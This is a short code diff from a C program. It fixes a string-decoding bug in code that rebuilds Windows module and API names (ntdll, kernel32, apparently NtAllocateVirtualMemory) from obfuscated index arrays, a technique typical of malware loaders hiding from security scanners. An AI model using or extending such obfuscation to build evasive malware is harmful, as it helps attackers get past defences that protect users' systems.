@@ -168,7 +168,7 @@ int main(int argc, char* argv[]) {
     HMODULE hNtdll = GetModuleHandleA(getoriginal(ntt, big_string, sizeof(ntt)));
     
     int ws_lld_ker_32[] = {36, 30, 43, 39, 30, 37, 55, 54, 62, 29, 37, 37};
-    const char* ker32 = getoriginal(ntt, big_string, sizeof(ws_lld_ker_32));
+    const char* ker32 = getoriginal(ws_lld_ker_32, big_string, sizeof(ws_lld_ker_32));
     HMODULE istfromKe__ws_ls_32 = GetModuleHandleA(getoriginal(ws_lld_ker_32, big_string, sizeof(ws_lld_ker_32)));
     
     int ntalloc_mem[] = { 39, 19, 26, 11, 11, 14, 2, 0, 19, 4, 47, 8, 17, 19, 20, 0, 11, 38, 4, 12, 14, 17, 24 };
